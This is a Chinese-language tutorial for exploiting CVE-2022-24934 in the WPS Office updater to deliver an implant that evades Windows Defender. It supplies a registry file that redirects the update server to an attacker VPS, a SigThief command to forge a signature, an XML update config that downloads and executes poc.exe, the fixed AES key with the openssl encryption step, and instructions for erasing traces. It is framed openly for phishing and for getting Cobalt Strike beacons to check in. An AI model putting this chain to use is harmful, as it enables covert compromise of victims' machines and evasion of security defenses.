利用wps的相关程序对windows系统进行攻击其实已经出现过一些了，比如利用wps的wpscloudsvr.exe来绕过UAC实现提权/白加黑实现免杀等。这次的CVE-2022-24934也为我们免杀提供了一个新的思路。 

利用场景：<br />任意用户，只要是可以用来进行登录的那种， 就可以使用这种方法绕过defender等杀软的动态查杀上线。在只有webshell的情况下，只要不是像iis权限那样低，一般也是可以使用这种方法上线的（已测试）。因此这种方法也会比较适合钓鱼攻击，因为所使用的两个exe文件都是可以通过查杀顺利运行的（使用defender和云沙箱都可以通过）。

优势：<br />目前来看，可以通过defender动态查杀的方法并不是很多，而且很多方法都随着defender自己的升级失效了。本次使用的wpsupdate漏洞免杀defender的方法，在短期看是无法通过defender升级解决，且由于这个程序可以独立于wps主程序运行，因此这种方法即使在用户未安装wps的情况下，依然可以顺利上线（当然同样的道理，如果用户已经更新到了比较安全的版本，我们也可以使用投递一个带有漏洞的wpsupdate.exe的方法实现上线）。

缺点：<br />使用过程过于复杂，这就是为什么需要写文档来介绍的原因。而且确实由于毕竟还是涉及到了修改注册表的操作，虽然可以用于登录的低权限test用户可以顺利上线，但当只有一个webshell且权限为iis的时候是没办法使用这种方法的。由于会修改注册表，用来投递上线木马的vps可能会暴露在防守人员面前，需要在完成上线操作后尽快恢复正常。

使用方法：<br />分为服务器端和客户端，服务器端可以架设在我们控制的vps上，客户端的部分则需要我们使用一些手段投递到受害者的主机上。接下来分别讲一下需要进行的操作：<br />客户端：<br />update.reg：需要修改的两个注册表项，内容如下：
```python
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Kingsoft\Office\6.0\Common]
"UpdateSvr"="http://192.168.1.1/update_config.bin"

[HKEY_CURRENT_USER\Software\Kingsoft\Office\6.0\Common\updateinfo]
"CheckInterval"=dword:00000000
```
需要我们自己修改的地方只有上面的“192.168.1.1”的位置，改为受害者机器可以访问到的vps的地址。<br />补充一下，如果想要修改注册表的话，可以把上面的reg文件直接导入到注册表中，也可以使用cmd命令：reg import update.reg来修改，也可以使用exe文件进行修改，这个根据使用场景不同，可以灵活选择。<br />wpsupdate.exe：正常但是有漏洞的wps升级程序，这个不需要任何操作。

服务器端：<br />poc.exe：进行静态免杀的上线木马。需要进行的操作是使用SigThief工具将wpsupdate.exe的签名复制到poc.exe中。
```python
python .\sigthief.py -i .\wpsupdate.exe -t .\poc0.exe -o poc.exe
```
update_config.bin：由xml文件进行默认密钥AES加密生成。想要生成bin文件，首先需要对xml文件进行修改：
```python
<?xml version="1.0" encoding="utf-8"?>
<update protocol="1.0">
    <actions>
        <action id="download">
            <files svr="http://127.0.0.1" downdir="%localappdata%">
                <file url = "/poc.exe" md5="c66f25dd442312b30f41bffb2f5bd0d5" size="25520"/>
            </files>
        </action>
        <action id="updatesetting">
            <infos>
                <info id = "1" fun="execute" param="JWxvY2FsYXBwZGF0YSVccG9jLmV4ZTtkR1Z6ZEY5d1lYSmhiUT09"/>
            </infos>
        </action>
    </actions>
</update>
```
这里需要修改的地方有以下几处，假设我们把文件都默认为poc.exe的话，修改得地方是最少的：<br />svr：需要改成受害者机器可以访问到的vps（不一定要和注册表中的一致，但是需要可以访问到）<br />md5：生成的木马文件的md5值，这里需要注意，一定要等到所有操作都完成（静态免杀、添加数字签名）后再计算md5，同理也需要修改size。<br />md5的计算可使用：certutil -hashfile poc.exe MD5<br />文件大小的计算可以自己计算，也可以使用在线转换网站：[https://www.bejson.com/convert/filesize/](https://www.bejson.com/convert/filesize/)

如果文件名不修改的话，就可以开始进行下一步了。但是如果文件名称需要改的话，底下的param就需要修改了，这个字符串是由两次base64 encode生成的，我们需要改的就是第一次base64 decode之后看到的一个文件名，然后直接再encode 一次生成对应param参数即可。<br />xml文件生成bin文件的操作使用openssl完成：
```python
openssl enc -aes-128-ecb -nosalt -K 886B1AB6F1FC1D6670EFA2D121039A56 -in update_config.xml -out update_config.bin
```
这里的key是不变的，只要我们使用这个漏洞进行攻击，就不用改-K后面的参数。<br />两个文件都处理完后，放到一个可以接受post请求的服务器目录下（我这里使用的是HFS这个工具，但是也可以使用其他的）。在客户端运行首先运行注册表导入的exe（也可以使用命令行，都是一样的）修改注册表后，运行wpsupdate，即可等待cs上线。

需要注意的是，成功上线的话，需要wpsupdate向我们搭建的服务器请求两个文件：Update_config.bin和poc.exe，如果我们看服务器的日志记录，发现只请求了一个的话，可能就是xml某个地方参数写错了，或者是之前的一次攻击没有清除掉原来落地的文件等原因，需要再排查一下。<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/12414108/1660532908988-1ae9e84c-e120-4c38-93a8-0608dd00718c.png#clientId=u633f6fa2-6b1b-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=93&id=ufc2bdc80&margin=%5Bobject%20Object%5D&name=image.png&originHeight=93&originWidth=1266&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8169&status=done&style=none&taskId=uc16afc0a-21be-4d4e-a4ec-647da14c79b&title=&width=1266)

清除痕迹：

1. 注册表项，参考上面的注册表内容，成功上线后即可恢复原始值（这里给一个参考：[http://update.wps.cn/updateserver/update;http://update2.wps.cn/updateserver/update](http://update.wps.cn/updateserver/update;http://update2.wps.cn/updateserver/update)）。
2. 落地的poc文件和注册表文件，注册表文件在修改完注册表后即可删除，poc文件的位置固定在C:\Users\用户名\AppData\Local\poc.exe，需要的话请及时删除，未删除无法进行再次攻击。




